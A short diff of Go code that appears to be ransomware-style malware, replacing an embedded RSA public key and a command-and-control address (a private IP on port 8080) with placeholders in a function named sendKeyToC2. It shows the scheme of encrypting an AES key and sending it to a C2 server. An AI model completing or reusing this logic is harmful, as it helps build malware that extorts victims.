@@ -19,13 +19,7 @@ import (
 
 // RSA Public Key
 const publicKeyPEM = `-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyRHrBvPn3px0HxItu/1Q
-molFZ+BvtaVRiSBi/eOaFrA7rYMzP0DPK97R7gAYIB7KoGdPQqISZd7ysh7ojWj0
-xHAtg1VKE+22XA2jfU23+6vsZKArfcCBv6itVcUL+XVs/MrGAeYJtFRB84SY89DK
-Y+CqditRXbca0IEHX9PYVKoAi2DkJdbRMfkDc+XJ5a03fab2NTb/09JkCzML8fMM
-dikFbbxur1Zi8b4fmNQsRuwyP0lrIpXkYn1w8cy/Jtkbl1e/jlIJA+/lS3TD2cZf
-LyOl92+PyalK6DCeW8ZdAsIVkDHEVxBopcr29ANYg9fv7TcgXn/Co8mUz2jeHdej
-dQIDAQAB
+AAAAA
 -----END PUBLIC KEY-----`
 
 // Generate a 32-byte AES key
@@ -66,7 +60,7 @@ func encryptAESKeyWithRSA(aesKey []byte) ([]byte, error) {
 }
 
 func sendKeyToC2(encryptedKey []byte) error {
-	c2URL := "http://192.168.188.148:8080"
+	c2URL := "C2 Server"
 
 	// Encode the encrypted key in Base64
 	encodedKey := base64.StdEncoding.EncodeToString(encryptedKey)
